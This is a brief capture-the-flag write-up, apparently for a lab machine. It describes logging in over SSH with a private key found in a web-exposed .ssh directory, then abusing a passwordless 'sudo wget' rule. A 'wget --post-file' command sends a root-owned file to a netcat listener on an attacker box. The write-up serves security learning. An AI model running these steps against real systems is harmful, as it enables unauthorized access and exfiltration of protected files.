#userflag

i wanted the user flag and root flag 
i had the lab machine ip of user named jessie 
now to ssh jessie's machine , i need a private key or a password . i went for the private key .
i enumerated the web-accessible directories of jessie's machine's ip and got a directory as .ssh in sitemap directory. that .ssh dir had a file named id_rsa which had the private key.
on opening ........../sitemap/.ssh/id_rsa , i got the private key.

for ssh , ised the command "ssh -i id_rsa jessie@ip" in the directory which contained the id_rsa file which i made.
i got the access to jessie's machine and in the Documents folder of /home/jessie was the user_flag.txt and BOOM!

#rootflag

Now I wanted to get the root flag.
After getting access to the machine as jessie, I checked what commands the jessie user could run with root privileges using:
sudo -l
I found that jessie could run /usr/bin/wget as root without entering a password:
(root) NOPASSWD: /usr/bin/wget
This meant I could use wget with sudo and perform actions with root privileges.
I used wget to send the contents of the root flag file to my own machine.
First, on my AttackBox, I started a netcat listener using the command: nc -lvnp 4545
Then, from the SSH session on the target machine, I used:
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<ATTACKBOX_IP>:4545
The --post-file option makes wget send the contents of the specified file in an HTTP POST request. Since wget was being executed with sudo, it could read the root-owned flag file.
The contents of root_flag.txt then appeared in my netcat listener.
BOOM! 
I successfully obtained the root flag.
